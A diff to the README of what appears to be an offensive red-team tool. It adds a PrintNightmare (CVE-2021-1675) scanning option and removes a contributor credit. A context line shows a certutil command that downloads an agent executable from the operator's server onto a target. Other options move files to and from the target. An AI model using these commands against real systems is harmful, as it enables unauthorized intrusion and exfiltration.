@@ -31,6 +31,7 @@ vulnerabilities.
 * CVE-2020-0796
 * CVE-2020-0797 
 * CVE-2020-1472
+* CVE-2021-1675
 
 ## Features 
 
@@ -99,6 +100,7 @@ certutil.exe -urlcache -split -f "http://nodejsip:4000/release/x64.exe" agent.ex
 -x --password to authorize your connection with node js application.
 -d --download Files directly into target machine.
 -t --upload Files From target machine into node js application.
+-spooler --scan single host or list of hosts for possible CVE-2021-1675 (e.g -spooler -srvhost or -spooler -hosts )
 -m --run all known scan Types together.
 
 [!] RED TEAMING TACTICS SECTION
@@ -125,11 +127,6 @@ https://0xsp.com
 
 ### Security Conferences 
 * Standoff365 - Russia (https://standoff365.com/conferences/357)
-
-### contribution 
-0xsp community would like to send much thanks for the following people who have contributed to make this project awesome  
-
-* Abboud Dokarli ( Web application API and interface ) @abbddkr
 
 ### tool tutorials 
 make sure to subscribe into the following channel to be notified when new tutorial and tricks published for 0xsp 
